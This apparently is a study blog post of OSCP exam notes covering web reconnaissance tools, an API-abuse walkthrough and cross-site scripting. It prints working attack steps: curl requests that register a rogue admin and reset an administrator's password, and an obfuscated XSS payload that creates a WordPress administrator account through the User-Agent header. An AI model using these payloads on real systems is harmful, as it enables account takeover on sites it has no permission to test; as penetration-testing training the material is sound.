---
title: Intro to Web App Attacks
date: 2024-01-15 08:35:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Web App Attack tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Intro to Web App Attacks

With the knowledge of common web app vulnerabilities, such as what we can learn from [OWASP Top 10](https://owasp.org/www-project-top-ten/), we will leverage Nmap, Wappalyzer, Gobuster, and Burp Suite to conduct testing.

## Web Application Assessment Tools

### Fingerprinting Web Servers with Nmap
```console
$ sudo nmap -p80 -sV 111.111.111.111
$ sudo nmap -p80 --script=http-enum 111.111.111.111    // script performs initial fingerprinting of webserver
```

### Tech Stack Identification with Wappalyzer
[Create a free account.](https://www.wappalyzer.com)

Perform a Technology Lookup on your target domain.

Results show details about the technology stack supporting the web server, including JavaScript libraries, many of which are vulnerable.

### Directory Brute Force with Gobuster
Gobuster enumerates publically-accessible files and directories using wordlists.

```console
$ gobuster dir -u 111.111.111.111 -w /usr/share/wordlists/dirb/common.txt -t 5
```

### Burp Suite
```console
$ burpsuite
```
#### Proxy Tool
Intercept requests from the browser before they are passed to the server.

Burp's default proxy listener is on port 8080, so set up both the Burp Proxy > Options and your internet browser's Network Proxy Settings to localhost:8080.

The Proxy > HTTP History shows requests and responses. 

In Proxy > HTTP History, select an entry, right click, and Send to Repeater. This allows you to modify requests in History and resend them.

#### Intruder
Intruder automates various attacks.

We need to configure our local Kali's hosts file to statically assign the IP to the target website.
```console
$ sudo nano /etc/hosts

// add line for target

$ cat etc/hosts
...
111.111.111.111 targetsite
```
Example Brute Force attack:


Navigate to a login page and enter any username and password, like "admin" and "test". Submit.

In Proxy > HTTP History, right click the POST to the login page and Send to Intruder.

In the Intruder tab, select the POST to modify and move to the Positions sub-tab.

Press Clear on the right hand side to remove all fields.

Select the password key value and press "Add".

In the Payloads tab, paste your chosen word list in the Payload Opetions [Simple list] section.

Click "Start Attack".

In the Results tab, look for requests that have different Status codes or Lengths.

## Web Application Enumeration

Firefox's Debugger tool in the Web Developer menu shows page resources and content, like JavaScript frameworks, hidden input fields, software versions, and client-side controls.

Right clicking on a field and navigating to the Inspect tool, we can see the related HTML, often showing us hidden form fields to test.

### Inspecting HTTP Response Headers and Sitemaps

We can use Burp or the browser's Network tool.

Sitemaps help search engine bots crawl website and instruct bots which directories/files not to crawl.

```console
$ curl https://www.google.com/robots.txt
```

### Enumerating and Abusing APIs

REST - Representational State Transfer - APIs are used for many purposes, including authentication.

Gobuster can be used to brute force API endpoints.

API paths typically look like /api_name/version_number

```console
$ nano pattern

{GOBUSTER}/v1
{GOBUSTER}/v2

$ gobuster dir -u http://111.111.111.111:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

/users/v1

$ curl -i http://111.111.111.111:5002/users/v1

    {
      "email": "admin@mail.com",
      "username": "admin"
    }

$ gobuster dir -u http://111.111.111.111:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

/password

$ curl -i http://111.111.111.111:5002/users/v1/admin/password

HTTP/1.0 405 METHOD NOT ALLOWED

// curl's default is GET - let's try POST or PUT
// but first, let's see if /login exists.

$ curl -i http://111.111.111.111:5002/users/v1/login
{ "status": "fail", "message": "User not found"}

// login exists! how do we interact with it?
// let' stry POST or PUT

$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}

// now we know the API parameters are correctly formed
// if we don't know the password, let's try to create a new user

$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/register
{ "status": "fail", "message": "'email' is a required property"}

$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://111.111.111.111:5002/users/v1/register

// maybe there's an administrative key we can abuse?

$ curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://111.111.111.111:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

// log in

$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://111.111.111.111:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}

// use this token to change the admin user's password

$ curl  \
  'http://111.111.111.111:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'


{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}

// let's try PUT

$ curl -X 'PUT' \
  'http://111.111.111.111:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

// no error message received above? you successfully changed the admin password!
// now, try to login as the admin user

$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}

// admin account pwned!

```

We can recreate all of the above steps in Burp:

Replicate the last admin login attempt and sent to the proxy appending the --proxy 127.0.0.1:8080 to the command.

```console
$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login --proxy 127.0.0.1:8080
```

Navigate to Burp's Repeater tab. Here, create a new empty request and fill it with the same data as we used in the above command. You should see the same behavior, and now you can test more APIs, faster.

After you've tested all interesting APIs, go to the Target tab and observe the Site map. From here, you can forward saved requests to Repeater or Intruder to test further.


## Cross-Site Scripting

Stored XSS (Persistent): exploit payload is stored in a db or otherwise cached by a server, allowing the payload to be displayed by any site user (think of comment sections, customer reviews, etc)

Reflected XSS: payload is included in a crafted request or link, only attacking the person using that request or link (think search fields or anywhere with user input included in error messages)

Both types of XSS can be client-side, server-side, or DOM-based.

DOM-based XSS is solely within a page's DOM (Document Object Model) which is data generated after a parse-through of a page's HTML content. To XSS in a DOM, modify the user-controlled values and insert JavaScript to be executed when the browser parses the content. DOM-based XSS can be client-side or server-side.

### JavaScript Review

JavaScript's job in a browser is to access and modify a web page's DOM.

For us, this means if we as attackers can inject JavaScript into the app, we can access and modify the page's DOM, giving us opportunities to grab passwords, steal cookies, and redirect login forms.

JavaScript is a loosly typed language, meaning variable types are inferred, not assigned.

### Identifying XSS Vulns

The most common special characters used for identifying unsanitized input fields: 
< > ' " { } ;
- HTML uses < and > to denote elements
- JavaScript uses { and } to declare functions
- Strings are denoted with ' or "
- Ends of statements are marked with ;

The most common types of encoding we will encounter in WebApps are HTML encoding and URL encoding (aka Percent encoding). URL encoding converts non-ASCII and reserved characters in URLs. HTML encoding can be used to display chars that normally serve some purpose, like tag elements. When we encounter HTML encoding, the browser will not interpret "<", for example, as the start of an element, but will show the character as is.

Tip: If our input is being stored between div tags, we must include our own script tags and be able to inject < and >. If our input is being stored within an existing JavaScript tag, we might just need quotes and semicolons.

### Basic XSS

If you have access to the source code, you can review it for unsanitized user input fields and exploit them from that knowledge.

We will typically be performing black box testing.

In Burp, browse to your target site and, in HTTP History, send the request to Repeater.

In Repeater, we can replace a value with a script, for example.

User-Agent: <script>alert(helloworld)</script>

If you happen to know that the field you changed is stored in the backend and you are going for a server-side payload: if your response is 200 OK, you can be confident that your payload is stored in a backend database.

### Privilege Escalation via XSS

Let's leverage XSS to steal cookies from authenticated users to escalate our privileges.

Pentesters are interested in two cookie flags: Secure and HttpOnly.
- Secure instructs browser to only send the cookie over encrypted connections, like HTTPS, to prevent cleartext transmission
- HttpOnly instructs the browser to deny JavaScript access to the cookie. If HttpOnly is NOT set, we can us XSS to steal the cookie.

[EXAMPLE](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/): HttpOnly is on, we must submut JavaScript via XSS:
Let's write a JavaScript function that creates a new admin account.
Firstly, write a JavaScript function that fetches the WordPress admin nonce.
- The nonce is a server-generated token that is in every HTTP request, adding randomness and preventing CSRF
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
Now we have the nonce. Let's write the function to create a new admin.
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
Before we can pass our JavaScript to Burp and the app, we must minify it and encode it.
To minify : [JS Compress](https://jscompress.com/)
To encode (to UTF-16):
```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

We must use the fromCharCode method to decode the string, and then run the string using the eval() methods. This can now be sent in a curl command.

```console
$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

At the end, we forwarded the request to the Burp proxy. Forward the Burp request, and you have successfully conducted a XSS attack.

